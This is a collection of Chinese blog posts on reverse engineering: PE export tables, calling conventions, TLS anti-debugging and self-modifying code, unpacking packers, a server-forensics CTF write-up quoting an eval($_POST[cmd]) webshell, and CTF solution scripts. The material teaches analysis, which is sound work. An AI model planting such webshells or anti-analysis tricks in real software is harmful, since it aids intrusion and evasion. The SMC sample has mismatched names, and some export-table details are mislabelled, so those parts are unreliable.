结构体的位置。IMAGE_OPTIONAL_HEADER32.DataDirectory[0].VirtualAddress 值即是 IMAGE_EXPORT_DIRECTORY 的起始地址（也是 RVA 的值）。 下图显示的是 kernel32.dll 文件的 IMAGE_OPTIONAL_HEADER32.DataDirectory[0]（第一个 4 字节为 VirtualAddress，第二个 4 字节为 Size 成员）。 IMAGE_OPTIONAL_HEADER32.DataDirectory 结构体数组信息整理如下表。 偏移 值 说明 00000160 00000000 loader flags 00000164 00000010 number of directories 00000168 0000262C RVA of EXPORT Directory 0000016C 00006D19 size of EXPORT Directory 00000170 00081898 RVA of IMPORT Directory 00000174 00000028 size of IMPORT Directory 由于 RVA 值为 262C，所以文件偏移为 1A2C。 IMAGE_EXPORT_DIRECTORYIMAGE_EXPORT_DIRECTORY 结构体如下。 12345678910111213typedef struct _IMAGE_EXPORT_DIRECTORY &#123; DWORD Characteristics; DWROD TimeDateStamp; // creation time date stamp WORD MajorVersion; WORD MinorVersion; DWORD Name; // address of library file name DWORD Base; // ordinal base DWORD NumberOfFunctions; // number of functions DWORD NumberOfNames; // number of names DWORD AddressOfFunctions; // address of function start address array DWORD AddressOfNames; // address of function name string array DWORD AddressOfNameOrdinals; // address of ordinal array&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; 下表为其中的重要成员（全部地址均为 RVA）。 项目 含义 NumberOfFunctions 实际 Export 函数的个数 NumberOfNames Export 函数中具名的函数个数 AddressOfFunctions Export 函数地址数组（数组元素个数=AddressOfFunctions） AddressOfNames 函数名称地址数组（数组元素个数=AddressOfNames） AddressOfNameOrdinals Ordinal 地址数组（数组元素个数=AddressOfNames） 下图是 kernel32.dll 文件的 IMAGE_EXPORT_DIRECTORY 结构体与整个 EAT 结构。 从库中获得函数地址的 API 为 GetProcAddress() 函数。该 API 引用 EAT 来获取指定 API 的地址。GetProcAddress() API 拥有函数名称，以下为它获取函数地址的过程。 利用 AddressOfNames 成员转到 “函数名称数组”。 “函数名称数组” 中存储着字符串地址。通过比较（strcmp）字符串，查找指定的函数名称（此时数组的索引称为 name_index）。 利用 AddressOfNameOrdinals 成员，转到 ordinal 数组。 在 ordinal 数组中通过 name_index 查找相应的 ordinal 值。 利用 AddressOfFunctions 成员转到 “函数地址数组”（EAT）。 在 “函数地址数组” 中将刚刚求得的 ordinal 用作数组索引，获得指定函数的起始地址。 kernel32.dll 中所有导出函数均有相应名称，AddressOfNameOrdinals 数组的值以 index=ordinal 的形式存在。但并不是所有的 DLL 文件都如此。导出函数中也有一些函数没有名称（仅通过 ordinal 导出），AddressOfNameOrdinals 数组的值为 index!=ordinal。所以只有按照上面的顺序才能获得准确的函数地址。 对于没有函数名称的导出函数，可以通过 Ordinal 查找到它们的地址。从 Ordinal 值中减去 IMAGE_EXPORT_DIRECTORY.Base 成员后得到一个值，使用该值作为 “函数地址数组” 的索引，即可查找到相应函数的地址。 Reference《逆向工程核心原理》https://bbs.pediy.com/thread-247114.htmhttps://bbs.pediy.com/thread-247303.htm","categories":[],"tags":[{"name":"re","slug":"re","permalink":"blog.b3ale.cn/tags/re/"}]},{"title":"RE入门（二）","slug":"RE入门（二）","date":"2019-01-27T03:54:09.000Z","updated":"2019-11-07T01:50:56.883Z","comments":true,"path":"2019/01/27/RE入门（二）/","link":"","permalink":"blog.b3ale.cn/2019/01/27/RE入门（二）/","excerpt":"了解一些 VB 的特性以及一些简单的的函数调用约定。","text":"了解一些 VB 的特性以及一些简单的的函数调用约定。 Visual BasicVB 专用引擎VB 文件使用名为MSVBVM60.dll（Microsoft Visual Basic Machine 6.0）的 VB 专用引擎（也称为 The Thunder Runtime Engine）。 举个使用 VB 引擎的例子，显示消息框时，VB 代码中要调用MsgBox()函数。其实，VB 编辑器真正调用的是MSVBVM60.dll里的rtcMsgBox()函数，在该函数内部通过调用user32.dll里的MessageBoxW()函数（Win32 API）来工作（也可以在 VB 代码中直接调用user32.dll里的MessageBoxW()）。 本地代码和伪代码根据使用的编译选项的不同，VB 文件可以编译为本地代码（N code）与伪代码（P code）。本地代码一般使用易于调试器解析的 IA-32 指令；而伪代码是一种解释器（Interpreter）语言，它使用由 VB 引擎实现虚拟机并可自解析的指令（字节码）。因此，若想准确解析 VB 的伪代码，就需要分析 VB 引擎并实现模拟器。 伪代码具有与 Java（Java 虚拟机）、Python（Python 专用引擎）类似的形态结构。使用伪代码的好处是非常方便代码移植（编写/发布针对特定平台的引擎，用户代码借助它几乎可以不加任何修改地在制定平台上运行）。 事件处理程序VB 主要来编写 GUI 程序，IDE 用户界面本身也最适合于 GUI 编程。由于 VB 程序采用 Windows 操作系统的事件驱动方式工作，所以在main()或WinMain()中并不存在用户代码（希望调试的代码），用户代码存在于各个事件处理程序（event handler）之中。 函数调用约定cdeclcdecl是主要在 C 语言中使用的方式，调用者负责处理栈。 1234567891011#include \"stdio.h\"int add(int a, int b)&#123; return (a + b);&#125;int main(int argc, char *argv[])&#123; return add(1, 2);&#125; 使用 VC++（关闭优化选项）编译代码生成cdecl.exe，使用 OllyDbg 调试。 从 401000~401020 地址间的代码可以发现，add()函数的参数 1、2 以逆序的方式入栈，调用add()函数（401000）后，使用ADD ESP,8命令整理栈。调用者main()函数直接清理其压入栈的函数参数，这样的方式是cdecl。 1234567891011121314151617181900401000 /$ 55 PUSH EBP ; # add00401001 |. 8BEC MOV EBP,ESP00401003 |. 8B45 08 MOV EAX,[ARG.1]00401006 |. 0345 0C ADD EAX,[ARG.2]00401009 |. 5D POP EBP0040100A \\. C3 RETN0040100B CC INT30040100C CC INT30040100D CC INT30040100E CC INT30040100F CC INT300401010 /$ 55 PUSH EBP ; # main00401011 |. 8BEC MOV EBP,ESP00401013 |. 6A 02 PUSH 0x2 ; / Arg2 = 0000000200401015 |. 6A 01 PUSH 0x1 ; | Arg1 = 0000000100401017 |. E8 E4FFFFFF CALL cdecl.00401000 ; \\ cdecl.004010000040101C |. 83C4 08 ADD ESP,0x80040101F |. 5D POP EBP00401020 \\. C3 RETN cdecl方式的好处在于它可以像 C 语言的printf()函数一样，向被调用函数传递长度可变的参数。这种长度可变的参数在其他调用约定中很难实现。 stdcallstdcall方式常用于 Win32 API，该方式由被调用者清理栈。C 语言默认的函数调用方式为cdecl。若想使用stdcall方式编译源码，只要使用_stdcall关键字即可。 1234567891011#include \"stdio.h\"int _stdcall add(int a, int b)&#123; return (a + b);&#125;int main(int argc, char *argv[])&#123; return add(1, 2);&#125; 使用 VC++（关闭优化选项）编译代码生成stdcall.exe文件后，使用 OllyDbg 调试。从代码中可以看到，在main()函数中调用add()函数后，省略了清理栈的代码（ADD ESP,8）。 栈的清理工作由add()函数中最后（40100A）的RETN 8命令来执行。RETN 8命令的含义为 RETN+POP 8 字节，即返回后使 ESP 增加到指定大小。 1234567891011121314151600401000 /$ 55 PUSH EBP ; # add00401001 |. 8BEC MOV EBP,ESP00401003 |. 8B45 08 MOV EAX,[ARG.1]00401006 |. 0345 0C ADD EAX,[ARG.2]00401009 |. 5D POP EBP0040100A \\. C2 0800 RETN 0x80040100D CC INT30040100E CC INT30040100F CC INT300401010 /$ 55 PUSH EBP ; # main00401011 |. 8BEC MOV EBP,ESP00401013 |. 6A 02 PUSH 0x2 ; / Arg2 = 0000000200401015 |. 6A 01 PUSH 0x1 ; | Arg1 = 0000000100401017 |. E8 E4FFFFFF CALL stdcall.00401000 ; \\ stdcall.004010000040101C |. 5D POP EBP0040101D \\. C3 RETN 像这样在被调用者add()函数内部清理栈的方式即为stdcall方式。stdcall方式的好处在于，被调用者函数内部存在着栈清理代码，与每次调用函数时都要用ADD ESP,XXX命令的cdecl方式相比，代码尺寸要小。虽然 Win32 API 是使用语言编写的库，但它使用的是stdcall方式，而不是 C 语言默认的cdecl方式。这是为了更好的兼容性，使 C 语言之外的其他语言（Delphi（Pascall）、Visual Basic 等）也能直接调用 API。 fastcallfastcall方式与stdcall方式基本类似，但该方式通常会使用寄存器（而非栈内存）去传递那些需要传递给函数的部分参数（前 2 个）。若某函数有 4 个参数，则前 2 个参数分别使用 ECX、EDX 寄存器传递。 顾名思义，fastcall方式的优势在于可以实现对函数的快速调用（从 CPU 的立场看，访问寄存器的速度要远比内存快得多）。单从函数调用本身来看，fastcall方式非常快，但是有时需要额外的系统开销来管理 ECX、EDX 寄存器。倘若调用函数前 ECX 与 EDX 中存有重要数据，那么使用它们前必须先备份。此外，如果函数本身很复杂，需要 ECX、EDX 寄存器用作其他用途时，也需要将它们中的参数值存储到另外某个地方。 References《逆向工程核心原理》https://www.jianshu.com/p/85a76f630c95https://bbs.pediy.com/thread-224583.htm","categories":[],"tags":[{"name":"re","slug":"re","permalink":"blog.b3ale.cn/tags/re/"}]},{"title":"2018-信息安全铁人三项赛总决赛-数据赛","slug":"2018-信息安全铁人三项赛总决赛-数据赛","date":"2018-12-08T11:44:17.000Z","updated":"2019-08-26T01:14:57.554Z","comments":true,"path":"2018/12/08/2018-信息安全铁人三项赛总决赛-数据赛/","link":"","permalink":"blog.b3ale.cn/2018/12/08/2018-信息安全铁人三项赛总决赛-数据赛/","excerpt":"第一次参加铁三，这次总决赛中的数据赛不再是之前的看数据包，而是直接给了一台 web 服务器溯源。","text":"第一次参加铁三，这次总决赛中的数据赛不再是之前的看数据包，而是直接给了一台 web 服务器溯源。 经验总结第一次接触，全队也就自己一个人在做，挖了坑也填了坑，记录一下。 服务器给的是命令行界面，不用想着变成图形界面来操作。因为我init 5变成图形界面后发现完全没法操作…后来为了变回去我误以为是init 0，直接把服务器关了…后来只能让让主办方帮忙重启一下，差点被扣分… 刚开始的时候我主要目标是在每个用户的家目录以及 web 服务的根目录下查看是否有一些隐藏文件，\b 还是可以收集到一些重要信息的。 然后在数据库的目录下也可以发现一些信息。 之后慢慢发现最重要其实是 web 服务下的一些 log 文件，记录了黑客对服务器攻击的主要过程。 后来我还发现在每个用户家目录下的.bash_history也是很有用的，可以看到黑客提权后干的事情。 查看文件的话，建议用less -mN filename，因为纯命令行的界面不能滚屏，用less就会方便很多。 刚登上服务器建议lastlog一下，看看除了 root 用户之外其他用户最后一次是什么时候登陆的。 其他命令的话，常用grep肯定是没错的… 然后比赛的时候也找了两篇关于服务器溯源的文章，记录一下： https://www.freebuf.com/articles/web/138867.html https://www.freebuf.com/articles/rookie/179638.html 比赛的时候因为我们队排名在后来不是很靠前，然后我信息的收集也不是很到位，第一题怕做错会扣分，万一我们连三等奖都拿不到了，就没敢做。比赛结束后才知道每个队伍都会获奖… \b 溯源过程记录题目差不多是这样：黑客在内网中拿到了两台肉鸡，然后通过这两台肉鸡对一台服务器进行了攻击，我们则需要对这台服务器溯源取证分析，并且找到黑客留下的后门。 刚拿到服务器，先在 \b 在 root 的家目录下查看了一下隐藏文件，没想到一下子就有收获： 在这里一下子就拿到了数据库的账号和密码。 然后尝试登陆一下数据库，发现有一个seacms的数据库，然后进去之后发现一些重要的信息： 看完数据库，我就去查了一下关于海洋 cms 的洞： https://www.freebuf.com/vuls/150042.html https://www.jianshu.com/p/ebf156afda49 大概知道了是在 web 根目录下的search.php中存在漏洞，然后通过分析黑客可能用来攻击的脚本，大概知道了攻击过程。 我这里还把search.php记录下来了： 在 web 目录下还看到了一个360safe，就截了张图： 然后我看了一下每个用户家目录下的.bash_history，正常的用户simple以及黑客创建的hacker都没啥，主要是 root 的.bash_history： 大概收集了这些，也能推断出黑客拿到权限后新建了一个叫 hacker 的用户，然后黑客的操作是从什么时候开始的也无法判断。再grep一下： 下一步我就开始看日志，通过对.bash_history的阅读，判断主要是在/var/log/httpd下和/var/www/html/logs下的 log 文件： 然后就开始对 log 文件一行一行看下来： 基本看到几个 ip： 在后面一点的时候会看到192.168.12.173，通过 GET 的 url 很容易判断出在用脚本打网站： 最后看到可以黑客在放后门eval($_POST[cmd])： 大概的分析就是这样，中间也踩了很多坑。我最后的判断是： IP IDENTITY OPERATING SYSTEM 192.168.31.119 admin windows 192.168.12.129 victim windows 192.168.12.173 bot windows 192.168.12.156 bot windows 192.168.12.125 bot android 192.168.31.73 bot android 感觉自己整体分析下来应该方向是没错的，可能因为自己没学过计网，对一些网络的 \b 协议和请求方式没有了解很透彻，导致比赛的时候第一题问两台肉鸡的 ip 就判断错了，然后就没敢做下去…","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"blog.b3ale.cn/tags/wp/"}]},{"title":"绕过TLS（Thread Local Storage）和SMC（Self Modifying Code）保护","slug":"绕过TLS（Thread Local Storage）和SMC（Self Modifying Code）保护","date":"2018-12-08T04:37:41.000Z","updated":"2019-09-09T04:44:35.469Z","comments":true,"path":"2018/12/08/绕过TLS（Thread Local Storage）和SMC（Self Modifying Code）保护/","link":"","permalink":"blog.b3ale.cn/2018/12/08/绕过TLS（Thread Local Storage）和SMC（Self Modifying Code）保护/","excerpt":"main 函数前有什么？","text":"main 函数前有什么？ TLS什么是 TLSTLS（Thread Local Storage）回调函数是每当创建/终止进程的线程时会自动调用执行的函数。创建的主线程也会自动调用回调函数，且其调用执行先于 EP（Entry Point）代码。功能就是把 PE 文件的 TEXT 段进行加密，隐藏他的静态代码段特性，在运行的时候抢在 main 函数执行之前把代码段直接在内存里面解密（不然就崩溃了），从而达到静态代码隐藏功能。 编写 TLS123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;windows.h&gt;#include&lt;stdio.h&gt;#include &lt;winnt.h&gt;#include &lt;stdlib.h&gt;//使用 TLS 回调函数#include &lt;tlhelp32.h&gt;//使用 TLS 的宏#pragma comment(linker, \"/INCLUDE:__tls_used\")void lookupprocess() &#123; PROCESSENTRY32 pe32; pe32.dwSize = sizeof(pe32); HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // 在快照中包含系统中所有的进程 BOOL bMore = Process32First(hProcessSnap, &amp;pe32); // 获得第一个进程的句柄 while (bMore) &#123; _wcslwr_s(pe32.szExeFile, wcslen(pe32.szExeFile)+1); if (!wcscmp(pe32.szExeFile, L\"ollyice.exe\")) &#123; printf(\"///////WARNING///////\\n\"); exit(0); &#125; if (!wcscmp(pe32.szExeFile, L\"ollydbg.exe\")) &#123; printf(\"///////\\nWARNING\\n///////\\n\"); exit(0); &#125; if (!wcscmp(pe32.szExeFile, L\"peid.exe\")) &#123; printf(\"///////\\nWARNING\\n///////\\n\"); exit(0); &#125; if (!wcscmp(pe32.szExeFile, L\"ida.exe\")) &#123; printf(\"///////\\nWARNING\\n///////\\n\"); exit(0); &#125; if (!wcscmp(pe32.szExeFile, L\"idaq.exe\")) &#123; printf(\"///////\\nWARNING\\n///////\\n\"); exit(0); &#125; bMore = Process32Next(hProcessSnap, &amp;pe32); // 获取下一个进程的句柄 &#125; CloseHandle(hProcessSnap);&#125;void Debugger(void) &#123; int result = 0; __asm &#123; mov eax, dword ptr fs:[30h] ; TEB偏移30H处 movzx eax, byte ptr ds:[eax + 2h] ; 取PEB中BeingDebug，若为1则被调试 mov result, eax &#125; if (result) &#123; printf(\"///////\\nWARNING\\n///////\\n\"); exit(0); &#125;&#125;void NTAPI tls_callback(PVOID h, DWORD reason, PVOID pv) &#123; lookupprocess(); Debugger(); MessageBox(NULL, L\"Not_Main_this_is_tls!\", L\"tls\", MB_OK); return;&#125;#pragma data_seg(\".CRT$XLB\")PIMAGE_TLS_CALLBACK p_thread_callback[] = &#123; tls_callback, 0 &#125;;#pragma data_seg()int main() &#123; MessageBox(NULL, L\"Main!\", L\"ESE\", MB_OK); return 0;&#125; 调试 TLS把有 TLS 保护的程序拖进 ida 分析，会看到 main 函数其实是空的： 1234int __cdecl main(int argc, const char **argv, const char **envp)&#123; return 0;&#125; 在 start（也就是 entry point）处下断点调试： 发现程序依然执行了，说明程序在 entry point 之前运行了。 同时可以查看 entry point list（Ctrl+E），发现 ida 也已经反编译出了一个叫做TlsCallback_0()的函数： 查看一下该函数的反汇编代码： 12345678void __stdcall TlsCallback_0(int a1, int a2, int a3)&#123; if ( a2 == 1 ) &#123; MessageBoxA(0, Text, Caption, 0); ExitProcess(0); &#125;&#125; 这也是许多未知程序在逆向时，更建议在虚拟环境下运行的原因。 手动去除 TLSTlsCallback 函数的定义： 1234567891011typedef VOID(NTAPI *PIMAGE_TLS_CALLBACK) ( PVOID DllHandle, // 模块句柄，即加载地址 DWORD Reason, PVOID Reserved );其中reason有以下几种：(winNT.h)#define DLL_PROCESS_ATTACH 1 // 进程启动#define DLL_THREAD_ATTACH 2 // 线程启动#define DLL_THREAD_DETACH 3 // 线程退出#define DLL_PROCESS_DETACH 0 // 进程退出 可以参照之前写过的一片writeup SMC什么是 SMCSMC（Self Modifying Code）是一种将可执行文件中的代码或数据进行加密，防止别人使用逆向工程工具（比如一些常见的反汇编工具）对程序进行静态分析的方法，只有程序运行时才对代码和数据进行解密，从而正常运行程序和访问数据。计算机病毒通常也会采用 SMC 技术动态修改内存中的可执行代码来达到变形或对代码加密的目的，从而躲过杀毒软件的查杀或者迷惑反病毒工作者对代码进行分析。现在，很多加密软件（或者称为“壳”程序）为了防止 Cracker（破解者）跟踪自己的代码，也采用了动态代码修改技术对自身代码进行保护。要精准的定位某个函数非常麻烦，所以我们就要以区块为加密的基础单位。 12345void encrypt_func(char *start_addr, int len) &#123; for(int i = 0; i &lt; len; i++) &#123; *(start + i) ^= 0x88; &#125;&#125; 编写 SMC因为定位一个具体的函数很繁琐，所以我们选择直接定位一个节表。把敏感的代码放入节表中，然后在需要的时候进行解密，这就是 SMC 动态加密技术的精髓。将下面这行代码放在开始程序的开始（也就是 include 下面），主要是让 text 节区可以执行、读、写和分享： 1#pragma comment(linker, \"/SECTION:.text,ERWS\") 以下代码可以编译生成可执行文件，但是无法运行，因为ck()函数的地址已经被打乱。这时候就利用 OD 进行修改，载入生成的程序，当程序运行enccrpt_func()函数完成时，ck()就已经完成加密，然后将程序 dump 下来，这时就可以运行。若拿一开始的程序去静态看，是完全看不懂的。 1234567891011121314151617181920212223242526272829#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;#pragma comment(linker, \"/SECTION:.text,ERWS\")void encrypt_func(char *start_addr, int len) &#123; for(int i = 0; i &lt; len; i++) &#123; // 这里对地址进行简单的加密 *(start + i) ^= 0x88; &#125;&#125;//需要保护的函数void ck() &#123; printf(\"this is a test of smc\");&#125;//加密数据结束的地址void end()&#123;&#125;int main() &#123; char *lp_s = 0; char *lp_e = 0; int len = 0; lp_s = (char *)ck; // 获取需要加密函数的起始地址 lp_e = (char *)end; // 获取需要加密函数的结束地址 len = lp_e - lp_s; enc(lp_s, len); // smc加密函数 ck();&#125; 解密 SMC 找到 smc 的加密函数，当运行完成 smc 解密函数时,将程序 dump 下来。 smc 对程序动态完全没有用，可以用 OD 来调试程序，找到受保护代码。 参考网站http://www.hexblog.com/?p=9http://www.voidcn.com/article/p-etaovjqz-bao.htmlhttp://www.uml.org.cn/c++/200710313.asphttps://esebanana.github.io/2018/04/08/re_10_tls_smc/http://www.voidcn.com/article/p-etaovjqz-bao.html","categories":[],"tags":[{"name":"re","slug":"re","permalink":"blog.b3ale.cn/tags/re/"}]},{"title":"简单压缩壳脱壳指南","slug":"简单压缩壳脱壳指南","date":"2018-11-29T09:04:10.000Z","updated":"2020-03-09T09:29:57.312Z","comments":true,"path":"2018/11/29/简单压缩壳脱壳指南/","link":"","permalink":"blog.b3ale.cn/2018/11/29/简单压缩壳脱壳指南/","excerpt":"记录一下脱一些简单压缩壳的过程（主要是找 OEP）。","text":"记录一下脱一些简单压缩壳的过程（主要是找 OEP）。 压缩壳和加密壳 在理解什么是压缩壳的时候，先了解什么是壳。壳可以简单理解为就是在 PE 文件中包含了代码，而又不影响 PE 文件的执行。其中压缩壳是让 PE 文件变小的壳。在运行加了压缩壳的程序时，壳先对程序进行解压缩，然后再运行源程序。 加密壳主要就是针对软件的加密保护，也有一些人用加密壳来做一些木马的免杀，导致一些杀软件查到该壳就误报病毒。加密壳的种类有很多，如果手工脱和修复，即使对高手来脱，也需要费很大力气。 压缩壳的原理（以 UPX 为例）压缩壳将程序的.text段和.data段进行压缩，不改变.rsrc段，并在运行时将对应的.text段和.data段解压缩来还原程序。 使用工具 调试工具：Ollydbg 查壳工具：ExeInfo/PEID 脱壳工具：LordPE、ImportRE OD 快捷键： 快捷键 功能 F7 单步步入 F8 单步步过 F4 运行到选定位置 F2 设置断点 Ctrl+F2 重新开始 F9 运行 Shift+F9 忽略异常运行 Alt+F9 执行到用户代码 脱壳LordPELordPE 用来将运行时的程序 dump 出来： 找到程序右键，修正镜像大小； 完整转存。 ImportRECImportREC 用来修复原始程序的 IAT： 找到程序，输入找到的OEP的值； 点击IAT自动搜索； 获取导入表； 显示无效的，如果有无效的表清除即可； 修正转储。 查找 OEP压缩壳的流程清楚了，修复 IAT 的过程也有了，我们只需要找到 OEP，就能完整地脱去一个压缩壳。 单步执行法单步执行法，通过单步执行一步一步，找到 OEP（程序入口点）。如果遇到向下的跳转则默认跳转： 遇到向上的跳转则直接执行到下一条语句，避免陷入循环，即 F4： 最后执行到 POPAD 处会有一个大范围的 JMP，即转到 OEP。 ESP 定律法（堆栈平衡法）利用压缩前后 ESP 不变的定律。在指令 PUSHAD 时单步一下，会发现寄存器中只有 ESP 发生变化： 然后右键 ESP 的值，跟随数据窗口： \b 接下来在数据窗口中选择 ESP 的值，并设置硬件访问断点，即在下次对 ESP 寄存器有读操作时被断下： 同样也可以通过 dd xxxxxxxx 或者 hr xxxxxxxx 设下硬件断点，在下方 command 处输入： 然后 F9 继续执行到 POPAD 后，删去硬件断点： 单步到 OEP。 特殊的 ESP 定律法不遵循 ESP 不变的定律，FSG2.0 专用的方法。单步走到 POPAD 的下一条指令，观察堆栈窗口从上往下数第四个地址的值即为 OEP 的地址。右键在反汇编窗口跟随： 下硬件断点后 f9 运行，到达 OEP。 二次内存镜像法以 UPX 为例。进入内存段中，先找到程序段的第一个 .rsrc，并设下断点后 Shift+F9 忽略异常执行，此处断下来后，压缩壳已经把所有的数据都解压缩了： 再在 UPX0 段下断，即恢复后的代码段，再重复上面的操作： 然后按照单步执行法往下走就能看到 POPAD 还有 JMP： 一步直达法以 UPX 为例。在遇到指令 PUSHAD 后，通过经验可以判断必存在 POPAD 来恢复通用寄存器，直接 Ctrl+F 搜索指令找到 OEP： 模拟跟踪法以 ASPack 为例。先进入内存中，找到 SFX： 在命令框输入 tc eip&lt;xxxxxxxx（即追踪 EIP 小于指定地址时的代码，也就是程序的代码段）： 会看到 OD 左上角变成了跟踪： 等待一段时间就会跳转到 OEP。 SFX 模拟跟踪法以 ASPack 为例。进入选项-&gt;调试设置（Alt+O）： 一般情况选择块方式跟踪或者字节方式，这里选择前者： 确定后，重新载入（Ctrl+F2），OD 会自动地去查找到 OEP。 最后一次异常法以 PECompact 为例。先在调试选项中忽略所有异常。重新载入后，执行 m 次 shift+f9，直到程序跑飞。然后重新载入程序，执行 m-1 次 shift+f9。在堆栈窗口中找到 SE 句柄，然后 Ctrl+G 转到 SE 句柄： 1234567891011120045DE74 B8 F9CB45F0 mov eax,0xF045CBF90045DE79 8D88 9E120010 lea ecx,dword ptr ds:[eax+0x1000129E]0045DE7F 8941 01 mov dword ptr ds:[ecx+0x1],eax0045DE82 8B5424 04 mov edx,dword ptr ss:[esp+0x4]0045DE86 8B52 0C mov edx,dword ptr ds:[edx+0xC]0045DE89 C602 E9 mov byte ptr ds:[edx],0xE90045DE8C 83C2 05 add edx,0x50045DE8F 2BCA sub ecx,edx ; ntdll_1.7720353D0045DE91 894A FC mov dword ptr ds:[edx-0x4],ecx ; qqspirit.0045DE740045DE94 33C0 xor eax,eax0045DE96 C3 retn0045DE97 B8 78563412 mov eax,0x12345678 ; 下断点 随后执行到断点处，单步跟到 OEP。 修复有时候脱完壳却不能运行程序，需要修复 IAT。首先载入 OD，在 OEP 往下找 Call： 找到后在命令框处输入 d xxxxxx： 在数据窗口中，往上查找，直到数据为 0，记录下 IAT 地址；往下也同样： 在 ImportREC 中修改 OEP 后，不采取自动获取的方式，手动输入 IAT 起始地址和大小，偷懒的办法是大小直接输 1000： 然后清除掉无效的，转储一下得到完整程序。 参考网站https://www.cnblogs.com/hongyuyingxiao/p/9630173.htmlhttps://findream.github.io/2018/07/15/%E5%B8%B8%E8%A7%81%E5%A3%B3%E7%9A%84%E8%84%B1%E5%A3%B3%E6%80%9D%E8%B7%AF/https://www.cnblogs.com/iBinary/p/7764483.html","categories":[],"tags":[{"name":"re","slug":"re","permalink":"blog.b3ale.cn/tags/re/"}]},{"title":"南邮-逆向","slug":"南邮-逆向","date":"2018-11-22T08:12:02.000Z","updated":"2019-11-11T06:50:57.721Z","comments":true,"path":"2018/11/22/南邮-逆向/","link":"","permalink":"blog.b3ale.cn/2018/11/22/南邮-逆向/","excerpt":"做了一下南邮的逆向题。","text":"做了一下南邮的逆向题。 Hello,RE!12$ file 1.exe1.exe: PE32 executable (console) Intel 80386, for MS Windows 32 位 PE 文件，拖进 ida 在 main 函数中就有 flag： 1234567891011121314151617181920212223242526272829303132int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [esp+11h] [ebp-7Fh] int v5; // [esp+75h] [ebp-1Bh] int v6; // [esp+79h] [ebp-17h] int v7; // [esp+7Dh] [ebp-13h] int v8; // [esp+81h] [ebp-Fh] int v9; // [esp+85h] [ebp-Bh] int v10; // [esp+89h] [ebp-7h] __int16 v11; // [esp+8Dh] [ebp-3h] char v12; // [esp+8Fh] [ebp-1h] __main(); printf(fmt); v5 = 'galf'; v6 = 'leW&#123;'; v7 = 'emoc'; v8 = '_oT_'; v9 = 'W_ER'; v10 = 'dlro'; v11 = '&#125;!'; v12 = 0; while ( scanf(\"%s\", &amp;v4) != -1 &amp;&amp; strcmp(&amp;v4, (const char *)&amp;v5) ) printf(aFlag); printf(aFlagoye); printf(aEc); printf(aEooaouctfNupts); printf(aOuU); getchar(); getchar(); return 0;&#125; 脚本： 12345678910#!/usr/bin/env pythonv5 = 'galf'v6 = 'leW&#123;'v7 = 'emoc'v8 = '_oT_'v9 = 'W_ER'v10 = 'dlro'v11 ='&#125;!'flag = v5[::-1] + v6[::-1] + v7[::-1] + v8[::-1] + v9[::-1] + v10[::-1] + v11[::-1]print flag ReadAsm2题目给了一个 main 函数： 123456789int main(int argc, char const *argv[])&#123; char input[] = &#123;0x0, 0x67, 0x6e, 0x62, 0x63, 0x7e, 0x74, 0x62, 0x69, 0x6d, 0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66, 0x63, 0x4e, 0x66, 0x7b, 0x71, 0x4a, 0x74, 0x76, 0x6b, 0x70, 0x79, 0x66 , 0x1c&#125;; func(input, 28); printf(\"%s\\n\",input+1); return 0;&#125; 以及一个汇编的 func 函数： 123456789101112131415161718192021222324252600000000004004e6 &lt;func&gt;: 4004e6: 55 push rbp 4004e7: 48 89 e5 mov rbp,rsp 4004ea: 48 89 7d e8 mov QWORD PTR [rbp-0x18],rdi ; first arg =&gt; input 4004ee: 89 75 e4 mov DWORD PTR [rbp-0x1c],esi ; second arg =&gt; length 4004f1: c7 45 fc 01 00 00 00 mov DWORD PTR [rbp-0x4],0x1 ; i = 1 4004f8: eb 28 jmp 400522 &lt;func+0x3c&gt; 4004fa: 8b 45 fc mov eax,DWORD PTR [rbp-0x4] ; &lt;func+0x14&gt; 4004fd: 48 63 d0 movsxd rdx,eax 400500: 48 8b 45 e8 mov rax,QWORD PTR [rbp-0x18] 400504: 48 01 d0 add rax,rdx 400507: 8b 55 fc mov edx,DWORD PTR [rbp-0x4] 40050a: 48 63 ca movsxd rcx,edx 40050d: 48 8b 55 e8 mov rdx,QWORD PTR [rbp-0x18] ; rdi 400511: 48 01 ca add rdx,rcx 400514: 0f b6 0a movzx ecx,BYTE PTR [rdx] ; input[rdx] 400517: 8b 55 fc mov edx,DWORD PTR [rbp-0x4] ; 1 40051a: 31 ca xor edx,ecx ; xor(input[i] ^ i) 40051c: 88 10 mov BYTE PTR [rax],dl 40051e: 83 45 fc 01 add DWORD PTR [rbp-0x4],0x1 ; i += 1 400522: 8b 45 fc mov eax,DWORD PTR [rbp-0x4] ; &lt;func+0x3c&gt; 400525: 3b 45 e4 cmp eax,DWORD PTR [rbp-0x1c] ; length 400528: 7e d0 jle 4004fa &lt;func+0x14&gt; 40052a: 90 nop 40052b: 5d pop rbp 40052c: c3 ret 分析 func 可以看到大概是对每个 byte 和递增的 i 异或，然后得到 flag。脚本： 123456#!/usr/bin/env pythonenc = [0x0, 0x67, 0x6e, 0x62, 0x63, 0x7e, 0x74, 0x62, 0x69, 0x6d, 0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66, 0x63, 0x4e, 0x66, 0x7b, 0x71, 0x4a, 0x74, 0x76, 0x6b, 0x70, 0x79, 0x66 , 0x1c]flag = ''for i in range(len(enc)): flag += chr(enc[i] ^ i)print flag Py 交易给了一个 pyc 文件，在线反编译一下或者用工具 python-uncompile6反编译得到源代码。 12345678910111213141516171819202122232425262728$ uncompyle6 Py.pyc# uncompyle6 version 3.2.4# Python bytecode 2.7 (62211)# Decompiled from: Python 2.7.16 (default, Mar 4 2019, 09:02:22)# [GCC 4.2.1 Compatible Apple LLVM 10.0.0 (clang-1000.11.45.5)]# Embedded file name: 1.py# Compiled at: 2017-06-03 10:20:43import base64def encode(message): s = '' for i in message: x = ord(i) ^ 32 x = x + 16 s += chr(x) return base64.b64encode(s)correct = 'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'flag = ''print 'Input flag:'flag = raw_input()if encode(flag) == correct: print 'correct'else: print 'wrong'# okay decompiling Py.pyc 照着写个脚本： 12345678#!/usr/bin/env pythonimport 